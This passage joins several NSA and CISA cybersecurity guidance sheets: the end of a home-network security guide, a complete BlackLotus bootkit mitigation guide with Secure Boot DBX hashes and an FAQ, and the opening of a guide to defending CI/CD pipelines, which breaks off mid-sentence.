information, but also your work information and networks when teleworking. Using a
virtual private network (VPN) to remotely connect to your internal corporate network via
a secure tunnel is one solution for securely accessing work information. This provides
an added layer of security while allowing you to take advantage of services normally
offered to on-site users. For more guidance on securing your VPN, refer to the
Selecting and Hardening Remote Access VPN Solutions
 cybersecurity information
guidance (CSI).
When connecting to other work services, such as websites and cloud-based office apps,
be sure that it is also through a secure tunnel by checking for a lock icon on the web
browser
s address bar. If you utilize commercial collaboration services, choose one that
provides strong encryption, preferably end-to-end encryption. For an in-depth look at
some commercial collaboration platforms refer to the 
Selecting and Safely Using
Collaboration Services for Telework
 CSI.
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
Recommendations for online behavior
Spearphishing, malicious ads, email attachments, and untrusted applications can
present concerns for home Internet users. To avoid revealing sensitive information,
abide by the following guidelines while accessing the Internet.
Follow email best practices
Email is a potential attack vector for hackers. The following recommendations help
reduce exposure to threats:
Avoid opening attachments or links from unsolicited emails. Exercise cyber
hygiene; do not open unknown emails or click on their attachments or web links.
Check the identity of the sender via secondary methods (phone call, in-person)
and delete the email if verification fails. For those emails with embedded links,
open a browser and navigate to the web site directly by its well-known web
address or search for the site using an Internet search engine.
To prevent reusing any compromised passwords, use a different password for
each account. Consider using a password manager to create and remember
strong, unique passwords.
Avoid using the out-of-office message feature unless it is necessary. Make it
harder for unknown parties to learn about your activities or status.
Always use secure email protocols, particularly if using a wireless network.
Configure your email client to use the transport layer security (TLS) option
(Secure IMAP or Secure POP3) to encrypt your email in transit between the mail
server and your device.
Never open emails that make outlandish claims or offers that are 
too good to be
true.
Upgrade to a modern browser and keep it up-to-date
Modern browsers are much better at prompting users when security features are not
enabled or used. Modern browsers help protect the confidentiality of sensitive
information in transit over the Internet. The browser should be kept up-to-date. When
conducting activities such as account logins and financial transactions, the browser
URL tab indicates that transit security is in place, usually with a lock icon.
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
Take precautions on social networking sites
Social networking sites are a convenient means for sharing personal information with
family and friends. However, this convenience also brings a level of risk. To protect
yourself, refer to the 
Keeping Safe on Social Media
 CSI guidance and do the following:
Avoid posting information, such as addresses, phone numbers, places of
employment, and other personal information, that can be used to target or harass
you. Some scam artists use this information, along with pet names, first car make
or model, and streets you have lived on, to figure out answers to account security
questions.
Limit access of your information to 
friends only
 and verify any new friend
requests outside of social networking.
Be cautious of duplicate or copycat profiles of current friends, family, or
coworkers. Malicious actors may use impersonated accounts to query you for
privileged information or target you for spearphishing.
Review the security policies and settings available from your social network
provider quarterly or when the site
s Terms of Use policy changes, as the
defaults can change. Opt-out of exposing personal information to search
engines.
Take precautions concerning unsolicited requests and links. Adversaries may
attempt to get you to click on a link or download an attachment that may contain
malicious software.
Authentication safeguards
Enable strong authentication on your router. Protect your login passwords and
take steps to minimize misuse of password recovery options.
Disable features that allow web sites or programs to remember passwords. Use
a password manager instead.
Many online sites use password recovery or challenge questions. To prevent an
attacker from leveraging personal information to answer challenge questions,
consider providing a false answer to a fact-based question, assuming the
response is unique and memorable.
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
Use multi-factor authentication (MFA) whenever possible. Examples of multifactor authentication include secondary confirmation phone/email, security
questions, and app/device-based identification. Some forms of MFA, such as
app/device-based identification, are more secure and should be used over less
secure methods, such as confirmation phone/email. When available, prefer using
phishing-resistant MFA options.
Exercise caution when accessing public hotspots
Many establishments, such as coffee shops, hotels, and airports, offer wireless hotspots
or kiosks for customers to access the Internet. Because the underlying infrastructure of
these is unknown and security may be weak, public hotspots are more susceptible to
malicious activity. If you must access the Internet while away from home, avoid direct
use of public wireless. When possible, use a corporate or personal Wi-Fi hotspot with
strong authentication and encryption. If public access is necessary, refer to 
Securing
Wireless Devices in Public Settings
 CSI for guidance and do the following:
If possible, use the cellular network (that is, mobile Wi-Fi, 4G, or 5G services) to
connect to the Internet instead of public hotspots. This option generally requires
a service plan with a cellular provider.
If you must use public Wi-Fi, use a trusted VPN. This option can protect your
connection from malicious activities and monitoring.
Exercise physical security in the public place. Do not leave devices unattended.
Do not exchange home and work content
The exchange of information between home systems and work systems via email or
removable media may put work systems at an increased risk of compromise. Ideally,
use organization-provided equipment and accounts to conduct work while away from
the office. If using a personal device, such as through a Bring Your Own Device (BYOD)
program, use corporate-mandated security products and guidance for accessing
corporate resources and networks. Try to connect to a remote desktop or terminal
server inside the corporate network rather than make copies of files and transport them
between devices. Avoid using personal accounts and resources for business
interactions. Always use a VPN or other secure channel to connect to corporate
networks and services to ensure your data is secured through encryption.
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA | Best Practices for Securing Your Home Network
Use separate devices for different activities
Establish a level of trust based on a device
s security features and its usage. Consider
segregating tasks by dividing them between devices dedicated to different purposes.
For example, one device may be for financial/personally identifiable information (PII)
use and another for games or entertainment for children.
Additional guidance
NSA cybersecurity guidance:
 Mobile Device Best Practices
 Secure Collaboration Platforms
 Compromised Personal Network Indicators and Mitigations
 NSA
s Top Ten Cybersecurity Mitigation Strategies
 Phishing resistant MFA
 Keeping Safe on Social Media
 Securing Wireless Devices in Public
General topics:
 National Information Assurance Partnership
Standards:
 NIST SP 800-124 Guidelines for Managing the Security of Mobile Devices in the
Enterprise
 NIST SP 800-63 Digital Identity Guidelines
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or guarantees. Reference
herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not
constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be
used for advertising or product endorsement purposes.
Trademarks
Blu-ray is a trademark of Blu-ray Disc Association.
Purpose
This document was developed in furtherance of NSA
s cybersecurity missions, including its responsibilities to identify and
disseminate threats to National Security Systems, Department of Defense, and Defense Industrial Base information systems, and to
develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate
stakeholders.
Contact
General cybersecurity inquiries: CybersecurityReports@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
U/OO/119184-23 | PP-23-0270 | FEB 2023 Ver. 1.0
TLP:CLEAR
National Security Agency | Cybersecurity Information
BlackLotus Mitigation Guide
Executive summary
BlackLotus is a recently publicized malware product garnering significant attention within tech
media. Similar to 2020
s BootHole (CVE-2020-10713), BlackLotus takes advantage of a boot
loader flaw
specifically CVE-2022-21894 Secure Boot bypass known as 
Baton Drop
take control of an endpoint from the earliest phase of software boot. Microsoft 
 issued patches
for supported versions of Windows to correct boot loader logic. However, patches were not
issued to revoke trust in unpatched boot loaders via the Secure Boot Deny List Database
(DBX). Administrators should not consider the threat fully remediated as boot loaders
vulnerable to Baton Drop are still trusted by Secure Boot.
As described in this Cybersecurity Information Sheet (CSI), NSA recommends infrastructure
owners take action by hardening user executable policies and monitoring the integrity of the
boot partition. An optional advanced mitigation is to customize Secure Boot policy by adding
DBX records to Windows
 endpoints or removing the Windows Production CA certificate from
Linux
 endpoints.
BlackLotus boot security threat
NSA recognizes significant confusion regarding the threat posed by BlackLotus. Some
organizations use terms like 
unstoppable,
unkillable,
 and 
unpatchable
 to describe the
threat. Other organizations believe there is no threat due to patches that Microsoft released in
January 2022 and early 2023 for supported versions of Windows. [1] The risk exists
somewhere between both extremes.
BlackLotus shares some characteristics with Boot Hole (CVE-2020-10713). [2] Instead of
breaking the Linux boot security chain, BlackLotus targets Windows boot by exploiting a flaw in
older boot loaders
also called boot managers
to set off a chain of malicious actions that
compromise endpoint security. Exploitation of Baton Drop (CVE-2022-21894) allows
BlackLotus to strip the Secure Boot policy and prevent its enforcement. Unlike Boot Hole, the
vulnerable boot loaders have not been added to the Secure Boot DBX revocation list. Because
the vulnerable boot loaders are not listed within the DBX, attackers can substitute fully patched
boot loaders with vulnerable versions to execute BlackLotus.
NSA recommends system administrators within DoD and other networks take action.
BlackLotus is not a firmware threat, but instead targets the earliest software stage of boot.
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
Defensive software solutions can be configured to detect and prevent the installation of the
BlackLotus payload or the reboot event that starts its execution and implantation. NSA
believes that currently published patches could provide a false sense of security for some
infrastructures. Because BlackLotus integrates Shim and GRUB into its implantation routine,
Linux administrators should also be vigilant for variants affecting popular Linux distributions.
Mitigation recommendations
Action 1: Update recovery media and activate optional mitigations
Recommended for all Windows infrastructures. Not applicable to Linux infrastructures.
NSA recommends Windows administrators install the latest security patches for their
endpoints. Microsoft patches from May 2023 contain optional software mitigations to prevent
rollback of the boot manager and kernel to versions vulnerable to Baton Drop and BlackLotus.
The optional mitigations 
 including a Code Integrity Boot Policy 
 should be enabled after the
organization has updated its Windows installation, recovery, and diagnostic software to the
latest available versions. [3]
Infrastructure administrators should note that Windows 10 and 11 have applicable security
updates and ongoing mitigation deployments for BlackLotus. Older, unsupported Windows
versions will not receive the full complement of BlackLotus mitigation measures. Windows
infrastructures should migrate to supported versions of Windows if running an unsupported
release. [3]
Action 2: Harden defensive policies
Recommended for all infrastructures. The malware install process for BlackLotus places an
older Windows boot loader Extensible Firmware Interface (EFI) binary into the boot partition,
disables Memory Integrity, disables BitLocker, and reboots the device. Many endpoint security
products (e.g., Endpoint Detection and Response, host-based security suites, user-monitoring
packages) can be configured to block one or more of these events outside of a legitimate,
scheduled update. Configure defensive software to scrutinize changes to the EFI boot partition
in particular. Alternatively, leverage application allow lists to permit only known and trusted
executables.
Action 3: Monitor device integrity measurements and boot configuration
Recommended for most infrastructures. Many endpoint security products and firmware
monitoring tools provide integrity-scanning features. Configure these products and tools to
monitor the composition of the EFI boot partition. Leverage these tools to look for unexpected
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
changes in bootmgfw.efi, bootmgr.efi, or the introduction of additional unexpected EFI binaries
(e.g., shimx64.efi or grubx64.efi). Changes to the boot partition are infrequent and warrant
additional scrutiny.
If unexpected changes are detected within the EFI boot partition, prevent the device from
rebooting. Endpoint and host defensive suites may allow creating rules or triggers that can be
paired with group policies to temporarily restrict reboot. Remediate the boot partition to a
known good state before permitting reboot. A reboot will execute EFI binaries and can implant
BlackLotus.
Microsoft has published specific information regarding the staging of BlackLotus components,
alterations to Windows registry values, and network indicators. Full specifics can be found at
the Microsoft Incident Response blog. [4]
Action 4: Customize UEFI Secure Boot
4.A. Instructions for Windows infrastructures. Expertly administered and exposed
infrastructures only. Not recommended due to limited long-term effectiveness.
BlackLotus relies upon older (pre-January 2022), signed Windows boot loader images to
implant a system. Secure Boot can be updated with DBX deny list hashes that prevent
executing older and vulnerable boot loaders. Public reporting [5] provides indications as to
which boot managers are observed exploited in the wild. In 2020, NSA published "UEFI
Secure Boot Customization" to provide guidance on modifying Secure Boot. Adding DBX
hashes qualifies as a partial customization action covered in section 4 "Customization,"
starting on page 7, and continuing through section 4.4.3 
Update the DB or DBX.
 [6]
Additionally, a GitHub.com repository has been set up with some helpful scripts and guides to
accomplish customization. [7]
Note: Adding boot loader hashes to the DBX may render many Windows install and recovery
images, discs, and removable media drives unbootable. Microsoft provides updated install and
recovery images for Windows 11 and 10. Only update the DBX after acquiring install and
recovery media with the January 2022 or later patch assortment applied (e.g., version 22H1 or
newer).
Warning: The following DBX hashes may be combined with the Secure Boot Customization
steps to revoke trust in select boot loaders vulnerable to Baton Drop. [6] However, more
vulnerable boot loaders exist than the DBX can contain. BlackLotus developers can rapidly
switch to alternate vulnerable boot loaders to evade DBX customization. Mitigating BlackLotus
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
via DBX updates is not recommended. Action 1
s patches and optional mitigations are
recommended instead.
Table: DBX hashes
UEFI Secure Boot DBX Hashes
B22A7B3CEBB32C80C36EAABB6F77D164AE8B76BF161F423B6E2FBF9DCBC96C02
D355041DFBA41F8AE2CE6766ECBC88C93A743FC74F95E7E7AA3EF32CA6E4B390
D9F629F6D1D83AC7A15DCB1116E4B9BF128758EC2EA389AA1E0DA3B8F2951150
53FCE58746C4B042B101B8682B4E52CE8B620D3C68F69034996E33D3DDDCA1FF
F7357DD5000E1FBADBF17CC6025243A243D1BFA705801051119277A30D717B71
39C6475B3F00D92EEC049D8F6EFA010CB06F1240ED1CE7E40611278C73817471
2E094D21DC457CC4826FCD48395B92DC782F978EEF8210E4B6F5E708527907FF
BFE0E68889A750E699788C11F08AFAE940770ED83C1B4A5DB27E10933B29CAD1
4.B. Instructions for Linux infrastructures. Expertly administered and exposed
infrastructures only.
Linux system administrators may forego adding DBX hashes in favor of removing the Microsoft
Windows Production CA 2011 certificate from Secure Boot
s DB. The total number of Baton
Drop-vulnerable boot loaders signed by the key associated with the Production CA
s certificate
is thought to exceed the available DBX memory. Removing the certificate negates the need to
add DBX entries related to Baton Drop and BlackLotus. Linux administrators will still need the
Microsoft Unified Extensible Firmware Interface (UEFI) Third Party Marketplace CA 2011
certificate to utilize Secure Boot with leading Linux distributions. [6]
Do not place the Windows Production CA 2011 certificate in the Machine Owner Key Exclusion
(MOKX) list in lieu of removing it from the DB. Utilizing MOKX in this way will cause the
revoked certificate to still be trusted between firmware initialization and the initialization of
Shim
s Secure Boot extensions.
The Windows Production CA 2011 certificate must be restored if converting the device from
Linux to Windows. Microsoft provides the certificate for download via their resources for
system manufacturers. [9]
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
Frequently asked questions
1. Is BlackLotus a firmware implant?
No. BlackLotus is boot software. The UEFI boot process involves several phases. Execution
control flow transitions from firmware to software following the Boot Device Select phase. [8]
2. Can BlackLotus be removed or quarantined?
Yes, prior to execution. Devices that boot to a BlackLotus EFI binary will need to be completely
reimaged. Attempts to remove BlackLotus following installation result in kernel errors.
3. Does BlackLotus bypass Secure Boot?
An initial bypass is followed by poisoning that configures Secure Boot to trust the malware. An
older, vulnerable boot loader that is trusted by Secure Boot is necessary to strip the Secure
Boot policy from being enforced so that BlackLotus can implant its entire software stack.
Subsequent boots extend the Microsoft UEFI signing ecosystem with a malicious BlackLotus
certificate. Thus, Secure Boot will trust the malware.
4. Which version of Windows is affected?
BlackLotus targets Windows 11 and 10. Variants may exist to target older, UEFI-booting
versions of Windows. Patches are available for Windows 8.1, 10, and 11.
5. Is Linux affected? Is there a version of BlackLotus that targets Linux?
No, not that has been identified at this time. BlackLotus does incorporate some Linux boot
binaries, but the malware targets Windows OS software. No Linux-targeting variant has been
observed.
6. Is BlackLotus really unstoppable?
 BlackLotus is very stoppable on fully updated Windows endpoints, Secure Bootcustomized devices, or Linux endpoints. Microsoft has released patches and continues to
harden mitigations against BlackLotus and Baton Drop. [1], [3], [4] The Linux community may
remove the Microsoft Windows Production CA 2011 certificate on devices that exclusively boot
Linux. Mitigation options available today will be reinforced by changes to vendor Secure Boot
certificates in the future (some certificates are expiring starting in 2026).
7. Where can I find more public information?
NSA is aware of several technically deep analysis reports posted online from security
researchers and vendors. One thorough source of public information is ESET Security
s blog
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
referenced as [5] in this report. Another source of information is the Microsoft Security
Response Center. [3], [4]
8. Should I reconfigure Secure Boot?
No. Secure Boot is best left enabled in standard mode. Only advanced infrastructures and
expert administrators should engage the custom/user-defined mode. Some security software
may require additional certificates or hashes to be added to the DB allow list or DBX deny list.
No one should disable Secure Boot on an endpoint built within the past 5 years.
9. Can a Trusted Platform Module (TPM) stop BlackLotus?
No. A TPM can only detect BlackLotus. Implant boot binaries are delivered to the EFI boot
partition after the TPM has recorded boot time measurements. Upon the next reboot, the TPM
captures measurements showing a BlackLotus infection. However, a TPM can only detect 
not prevent 
 implantation as the TPM is an observer and container of integrity indicator data.
A TPM does not have an active enforcement capability.
In a Network Access Control (NAC) infrastructure based on TPM attestation, NAC would
prevent infected machines from accessing protected resources by indicating changes in
Platform Configuration Registers (PCRs) 4-7. NAC also provides an opportunity to remediate
affected endpoints prior to connecting to a protected resource.
10. Can TPM-extended Shim / TrustedShim (T-Shim) stop BlackLotus?
No. T-Shim checks TPM measurements recorded prior to the main boot loader. Secure Boot is
responsible for enforcement following T-Shim.
11. What is Secure Boot customization?
Customization involves one of the following:
Partial customization 
 augmenting the Microsoft and system vendor Secure Boot
ecosystem with additional DB and DBX entries as necessary to enable signature and
hash checks on unsupported/custom software or block unwanted software.
Full customization 
 replacing all vendor and Microsoft certificates and hashes with
those generated and selected by the infrastructure owner (requires specialized
knowledge of hardware values).
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
12. How does BlackLotus compare to Boot Hole?
Boot Hole involved flaws in Secure Boot-signed GRUB boot loaders. A configuration file could
be created to cause buffer overflows and arbitrary code execution at boot time. Secure Boot
could be ignored and completely bypassed.
BlackLotus is sophisticated malware observed in the wild. It exploits a flaw (known as Baton
Drop) in Secure Boot-signed copies of the Windows Boot Manager to truncate the Secure Boot
policy values. Instead of stopping due to the lack DB and DBX values, the vulnerable boot
manager allows boot to continue. BlackLotus injects a version of Shim utilizing its own
Machine Owner Key (MOK) 
 similar to the allow list DB 
 to vouch for signatures on its own
malicious binaries. The result is Secure Boot remains enforcing while silently poisoned and
permitting malware to execute.
13. Why doesn
t NSA recommend setting up a custom Secure Boot
ecosystem as a mitigation?
NSA has internally piloted efforts to exclusively rely on custom certificates and hashes to
define Secure Boot policy. Pilot efforts have proven effective at preventing threats like
BlackLotus, Baton Drop, BootHole, and similar prior to discovery. However, the administrative
overhead and vendor collaboration necessary represent a resource investment not appropriate
for most enterprise infrastructures. The process of fully customizing Secure Boot is also not
capable of being automated outside of a narrow selection of workstation and server products.
14. Can Trusted eXecution Technology (TXT) stop BlackLotus?
Yes, if and only if the TPM non-volatile memory (NVRAM) policy is set to boot a specific boot
loader. In practice, setting a specific boot loader has caused administrative challenges when
handling updates that affect the EFI boot partition. TXT is not a recommended mitigation given
the likelihood to render endpoints temporarily unbootable.
15. Are virtual machines affected?
Yes. VMs boot into a virtual UEFI environment. BlackLotus targets the OS software boot
loaders that execute following the virtual firmware initialization.
Works cited
[1] Microsoft Security Response Center (2022), January 2022 Security Updates.
https://msrc.microsoft.com/update-guide/releaseNote/2022-Jan
[2] Eclypsium (2020), There
s a Hole in the Boot. https://eclypsium.com/2020/07/29/theres-a-hole-in-the-boot
[3] Microsoft Security Response Center (2023), KB5025885: How to manage the Windows Boot Manager
revocations for Secure Boot changes associated with CVE-2023-24932.
https://support.microsoft.com/help/5025885
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
NSA | BlackLotus Mitigation Guide
[4] Microsoft Incident Response (2023), Guidance for investigating attacks using CVE-2022-21894: The
BlackLotus campaign. https://www.microsoft.com/en-us/blog/2023/04/11/guidance-for-investigatingattacks-using-cve-2022-21894-the-blacklotus-campaign
[5] Smolar, Martin (2023), BlackLotus UEFI Bootkit: Myth Confirmed.
https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed
[6] National Security Agency (2020), UEFI Secure Boot Customization [S/N: U/OO/168873-20].
https://media.defense.gov/2020/Sep/15/2002497594/-1/-1/0/CTR-UEFI-SECURE-BOOTCUSTOMIZATION-20200915.PDF/CTR-UEFI-SECURE-BOOT-CUSTOMIZATION-20200915.PDF
[7] National Security Agency (2020), UEFI Secure Boot Customization.
https://github.com/nsacyber/Hardware-and-Firmware-Security-Guidance/tree/master/secureboot
[8] Carnegie Mellon University (2022), UEFI 
 Terra Firma for Attackers.
https://insights.sei.cmu.edu/blog/uefi-terra-firma-for-attackers/
[9] Microsoft (2022), Windows Secure Boot Key Creation and Management Guidance.
https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-secure-boot-keycreation-and-management-guidance
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or guarantees.
Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or
otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government. This
guidance shall not be used for advertising or product endorsement purposes.
Purpose
This document was developed in furtherance of NSA
s cybersecurity missions, including its responsibilities to identify and
disseminate threats to National Security Systems, Department of Defense, and Defense Industrial Base information systems,
and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all
appropriate stakeholders.
Contact
Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
U/OO/167397-23 | PP-23-1628 | JUN 2023 Ver. 1.0
National
Security
Agency
Cybersecurity and
Infrastructure
Security Agency
TLP:CLEAR
| Cybersecurity Information
Defending Continuous Integration/Continuous
Delivery (CI/CD) Environments
Executive summary
The National Security Agency (NSA) and the Cybersecurity and Infrastructure Security
Agency (CISA) are releasing this cybersecurity information sheet (CSI) to provide
recommendations and best practices for improving defenses in cloud implementations
of development, security, and operations (DevSecOps). This CSI explains how to
integrate security best practices into typical software development and operations
(DevOps) Continuous Integration/Continuous Delivery (CI/CD) environments, without
regard for the specific tools being adapted, and leverages several forms of government
guidance to collect and present proper security and privacy controls to harden CI/CD
cloud deployments. As evidenced by increasing compromises over time, software
supply chains and CI/CD environments are attractive targets for malicious cyber actors
(MCAs). Figure 1 provides a high-level representation of threats to various parts of the
CI/CD pipeline.
Figure 1: Threats to the CI/CD pipeline
This document is marked TLP:CLEAR. Disclosure is not limited. Recipients may distribute TLP:CLEAR information
without restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Contents
Defending Continuous Integration/Continuous Delivery (CI/CD) Environments .............. 1
Executive summary ......................................................................................................... 1
Introduction ..................................................................................................................... 4
Key terms ........................................................................................................................ 5
CI/CD security threats ..................................................................................................... 6
Attack surface ................................................................................................................. 6
Insecure code .............................................................................................................. 7
Poisoned pipeline execution ........................................................................................ 7
Insufficient pipeline access controls............................................................................. 7
Insecure system configuration ..................................................................................... 7
Usage of third-party services ....................................................................................... 7
Exposure of secrets ..................................................................................................... 8
Threat scenarios ............................................................................................................. 8
Active hardening ............................................................................................................. 9
Authentication and access mitigations ....................................................................... 10
Use NSA-recommended cryptography................................................................... 10
Minimize the use of long-term credentials .............................................................. 10
Add signature to CI/CD configuration and verify it.................................................. 10
Utilize two-person rules (2PR) for all code updates ............................................... 11
Implement least-privilege policies for CI/CD access .............................................. 11
Secure user accounts ............................................................................................ 12
Secure secrets ....................................................................................................... 12
Implement network segmentation and traffic filtering ............................................. 12
Development environment mitigations ....................................................................... 12
Maintain up-to-date software and operating systems ............................................. 12
Keep CI/CD tools up-to-date .................................................................................. 13
Remove unnecessary applications......................................................................... 13
Implement endpoint detection and response (EDR) tools ...................................... 13
Development process mitigations .............................................................................. 13
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Integrate security scanning as part of the CI/CD pipeline ...................................... 13
Restrict untrusted libraries and tools ...................................................................... 14
Analyze committed code ........................................................................................ 14
Remove any temporary resources ......................................................................... 14
Keep audit logs ...................................................................................................... 14
Implement software bill of materials (SBOM) and software composition analysis
(SCA) ..................................................................................................................... 14
Plan, build, and test for resiliency........................................................................... 15
Conclusion .................................................................................................................... 15
Further guidance ........................................................................................................... 16
Works cited ................................................................................................................... 16
Appendix A: CI/CD threats mapped to MITRE ATT&CK ............................................... 18
Initial Access .............................................................................................................. 18
Execution ................................................................................................................... 19
Persistence ................................................................................................................ 19
Privilege Escalation ................................................................................................... 20
Defense Evasion........................................................................................................ 21
Credential Access ...................................................................................................... 21
Lateral Movement ...................................................................................................... 22
Exfiltration .................................................................................................................. 23
Figures
Figure 1: Threats to the CI/CD pipeline ........................................................................... 1
Figure 2: Different attack vectors in an AWS CI/CD pipeline ........................................... 9
Figure 3: CI/CD attack vectors mapped to ATT&CK techniques and D3FEND
countermeasures .......................................................................................................... 18
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Introduction
Continuous Integration/Continuous Delivery (CI/CD) is a development process for
quickly building and testing code changes that helps organizations maintain a consistent
code base for their applications while dynamically integrating code changes. CI/CD is a
key part of the development, security, and operations (DevSecOps) approach that
integrates security and automation throughout the development lifecycle. CI/CD
pipelines are often implemented in commercial cloud environments because of the
cloud
s role in IT modernization efforts. Organizations are constantly leveraging CI/CDfocused tools and services to securely streamline software development and manage
applications and clouds
 programmable infrastructure. Therefore, CI/CD environments
are attractive targets for malicious cyber actors (MCAs) whose goals are to compromise
information by introducing malicious code into CI/CD applications, gaining access to
intellectual property/trade secrets through code theft, or causing denial of service effects
against applications.
NSA and CISA authored this CSI to provide recommendations and best practices for
hardening CI/CD pipelines against MCAs to secure DevSecOps CI/CD environments,
regardless of the tools being adapted. It outlines key risks for CI/CD deployments, using
the MITRE ATT&CK
 framework to enumerate the most significant potential CI/CD
vulnerabilities based on known threats. See Appendix A for details on the tactics,
techniques, and countermeasures for the threats mapped to ATT&CK and D3FEND
NSA and CISA encourage organizations to implement the proposed mitigations to
harden their CI/CD environments and bolster organizational DevSecOps. By
implementing the proposed mitigations, organizations can reduce the number of
exploitation vectors into their CI/CD environments and create a challenging environment
for the adversary to penetrate.
This CSI utilizes several government guides to collect and present the proper security
and privacy controls to harden CI/CD environments.
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Key terms
Continuous delivery (CD) is the stage after continuous integration where code
changes are deployed to a testing and/or staging environment after the build stage.
Continuous deployment is similar to continuous delivery except that the releases
happen automatically, and changes to code are available to customers immediately
after they are made. The automatic release process may in many instances include A/B
testing to facilitate slow rollout of new features, thereby mitigating the impact of failure
resulting from a bug or error. [1]
Continuous integration (CI) involves developers frequently merging code changes into
a central repository where automated builds and tests run. Build is the process of
converting the source code to executable code for the platform on which it is intended to
run. In the CI/CD pipeline software, the developer
s changes are validated by creating a
build and running automated tests against the build. This process avoids the integration
challenges that can happen when waiting for release day to merge changes into the
release branch. [1]
A CI/CD pipeline is a component of a broader toolchain that entails continuous
integration, version control, automated testing, delivery, and deployment. It automates
the integration and delivery of applications and enables organizations to deploy
applications quickly and efficiently. [2]
Development operations (DevOps) is a set of practices that combines software
development and information technology (IT) operations. It aims to shorten the systems
development lifecycle and provide continuous delivery with high software quality.
DevSecOps (DevSecOps) is an approach that integrates development (Dev), security
(Sec), and delivery/operations (Ops) of software systems to reduce the time from a
recognized need to capability availability and provide continuous integration and
continuous delivery (CI/CD) with high software quality.
A software supply chain is composed of the components, libraries, tools, and
processes used to develop, build, and publish a software artifact. Software vendors
often create products by assembling open source and commercial software
components. Software supply chains are made up of software components, such as
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
open source packages and infrastructure as code (IaC) templates, as well as underlying
delivery pipelines, such as version control systems and CI/CD pipelines.
Software composition analysis is an automated process that identifies the software in
a code base. This analysis is performed to evaluate security, license compliance, and
code quality.
CI/CD security threats
Software supply chains and CI/CD environments are attractive targets for MCAs. CI/CD
pipeline compromises are increasing. Recognizing the various types of security threats
that could affect CI/CD operations and taking steps to defend against each one are
critical to securing a CI/CD environment. Common examples of risks in CI/CD pipelines
are listed here. For a more comprehensive description, refer to the OWASP Top 10
CI/CD Security Risks. [3]
Insecure first-party code: Code that is checked in by authorized developers but
that contains security-related bugs that are not detected by either the software
developers or by security tooling.
Insecure third-party code: Insecure code that is compiled into a CI/CD pipeline
from a third-party source, such as an open source project.
Poisoned pipeline execution: Exploitation of a development/test/production
environment that allows the attacker to insert code of its choosing.
Insufficient pipeline access controls: Unauthorized access to source code
repositories or build tools.
Insecure system configuration: Various infrastructure, network, and application
configurations vulnerable to known exploitation techniques.
Usage of insecure third-party services: Using services created by an external
individual or organization that intentionally or negligently includes security
vulnerabilities.
Exposure of secrets: Security key compromise and insecure secrets
management within the pipeline, such as hardcoding access keys or passwords
into infrastructure as code (laC) templates.
Attack surface
An insecure CI/CD pipeline can easily lead to an insecure application. Some of the
attack surfaces that MCAs can exploit are as follows:
U/OO/170159-23 | PP-23-1680 | JUN 2023 Ver. 1.0
TLP:CLEAR
TLP:CLEAR
NSA, CISA | Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
Insecure code
Insecure code within a CI/CD pipeline can include code defects from the authorized
developers, open source components, or third-party integrations that are not effectively
evaluated or vetted. Rapid development without proper security can introduce
vulnerabilities and expose the pipeline to critical risks. Integration of third-party code
and lack of code scanning of source code components can introduce vulnerabilities into
a CI/CD pipeline. Not following code security best practices can significantly increase
the vulnerable attack surface. Common code vulnerabilities include buffer overflows,
format string vulnerabilities, and improper error handling.
Poisoned pipeline execution
Poisoned pipeline execution (PPE) is a technique that MCAs use to poison the Cl
pipeline. This technique allows MCAs to abuse permissions in source code
management repositories to manipulate the build process. During this type of
